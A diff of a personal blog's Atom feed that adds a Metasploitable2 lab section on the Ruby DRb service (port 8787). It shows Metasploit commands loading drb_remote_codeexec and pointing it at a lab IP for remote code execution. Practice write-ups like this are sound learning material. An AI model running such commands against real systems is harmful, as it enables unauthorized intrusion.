@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-06T15:24:16-05:00</updated>
+  <updated>2016-07-06T16:02:02-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -912,6 +912,21 @@
 
 
 <p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Ruby DRb RMI (port 8787)</h3>
+
+<p>search drb, find an exploit <code>exploit/linux/misc/drb_remote_codeexec</code></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='jsp'><span class='line'>msf &gt; use exploit/linux/misc/drb_remote_codeexec
+</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set uri druby://192.168.79.179:8787
+</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; exploit
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_039.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
